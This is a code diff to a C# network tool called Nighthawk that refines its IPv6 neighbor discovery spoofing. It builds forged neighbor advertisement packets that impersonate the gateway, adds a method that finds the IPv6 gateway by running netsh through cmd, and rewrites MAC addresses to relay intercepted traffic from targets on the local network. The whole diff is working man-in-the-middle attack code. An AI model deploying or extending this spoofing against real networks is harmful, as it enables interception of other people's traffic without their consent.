@@ -1,8 +1,10 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.Linq;
 using System.Net.NetworkInformation;
 using System.Net;
+using System.Text.RegularExpressions;
 using System.Threading;
 using SharpPcap.WinPcap;
 using PacketDotNet;
@@ -50,6 +52,7 @@ namespace Nighthawk
         private PhysicalAddress physicalAddress;
 
         private string prefix;
+        private string gatewayIPv6;
 
         public NDTools(DeviceInfo deviceInfo)
         {
@@ -61,6 +64,7 @@ namespace Nighthawk
         public void StartSpoofing(string prefix, List<Target> targets)
         {
             this.prefix = prefix;
+            gatewayIPv6 = deviceInfo.GatewayIPv6;
 
             physicalAddress = deviceInfo.PMAC;
 
@@ -126,17 +130,55 @@ namespace Nighthawk
         {
             // prepare neighbor advertisement packet
             var bytes = Network.HexToByte(
-                IPv6toMACTargets[prefix]
+                IPv6toMACTargets[gatewayIPv6]
                 + deviceInfo.PMAC.ToString() +
                 "86dd6000000000203aff"
                 + Network.IPv6ToFullHex(sourceIP)
-                + Network.IPv6ToFullHex(prefix)
+                + Network.IPv6ToFullHex(gatewayIPv6)
                 + "880067f760000000"
                 + Network.IPv6ToFullHex(sourceIP)
                 + "0201"
                 + deviceInfo.PMAC.ToString());
 
             return (EthernetPacket)Packet.ParsePacket(LinkLayers.Ethernet, bytes);
+        }
+
+        // get IPv6 gateway
+        public string GetIPv6Gateway()
+        {            
+            OperatingSystem system = Environment.OSVersion;
+
+            // prepare process
+            Process p = new Process();
+
+            p.StartInfo.CreateNoWindow = true;
+            p.StartInfo.UseShellExecute = false;
+            p.StartInfo.RedirectStandardOutput = true;
+            p.StartInfo.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
+            p.StartInfo.FileName = "cmd";
+
+            // Vista, Windows 7 - use "netsh"
+            if (system.Version.Major > 5)
+            {
+                p.StartInfo.Arguments = "/k netsh int ipv6 show route | findstr ::/0";
+                p.Start();
+                
+                var output = p.StandardOutput.ReadToEnd();
+
+                p.WaitForExit();
+                
+                var lines = output.Contains("\r\n") ? Regex.Split(output, "\r\n") : new string[] {output};
+                var line = lines.First();
+
+                var parts = Regex.Split(line, " ");
+                var gateway = parts[parts.Length - 1];
+
+                return gateway;
+            }
+
+            p.Close();
+
+            return string.Empty;
         }
 
         // worker function for sending RA packets
@@ -152,7 +194,7 @@ namespace Nighthawk
                 foreach (var target in IPv6toMACTargets)
                 {
                     // send spoofed ND advertisements to the gateway
-                    sendQueue.Add(GenerateNDAdvertisement(target.Key).Bytes);
+                    if(target.Key != gatewayIPv6) sendQueue.Add(GenerateNDAdvertisement(target.Key).Bytes);
                 }
 
                 sendQueue.Transmit(device, SendQueueTransmitModes.Normal);
@@ -207,7 +249,7 @@ namespace Nighthawk
                         if (sourceIP == deviceInfo.IPv6 || destinationIP == deviceInfo.IPv6) continue;
 
                         // skip local network traffic
-                        if (sourceIP.Contains(prefix.Replace("::", ":")) && destinationIP.Contains(prefix.Replace("::", ":"))) continue;
+                        if ((sourceIP.Contains(prefix.Replace("::", ":")) && destinationIP.Contains(prefix.Replace("::", ":"))) || (sourceIP.Contains("fe80::") || destinationIP.Contains("fe80::"))) continue;
                         
                         // check for IPv6 - MAC entry existance (check only addresses from this network) and add it if necessary (we need this because scanner cannot pick up IPv6 addresses of all the targets)
                         if (sourceIP.Contains(prefix.Replace("::", ":")) && !IPv6toMACTargets.ContainsKey(sourceIP) && !sourceIP.Contains("fe80::"))
@@ -228,10 +270,10 @@ namespace Nighthawk
                         }
 
                         // outgoing packets (targets -> nighthawk) - change destination MAC to gateway's MAC
-                        if (IPv6toMACTargets.ContainsKey(sourceIP) && (destinationMAC != IPv6toMACTargets[prefix].ToString()))
+                        if (IPv6toMACTargets.ContainsKey(sourceIP) && (destinationMAC != IPv6toMACTargets[gatewayIPv6].ToString()))
                         {
                             ethernetPacket.SourceHwAddress = physicalAddress;
-                            ethernetPacket.DestinationHwAddress = IPv6toMACTargets[prefix];
+                            ethernetPacket.DestinationHwAddress = IPv6toMACTargets[gatewayIPv6];
 
                             if (ethernetPacket.Bytes != null) sendQueue.Add(packet.Bytes);
                         }
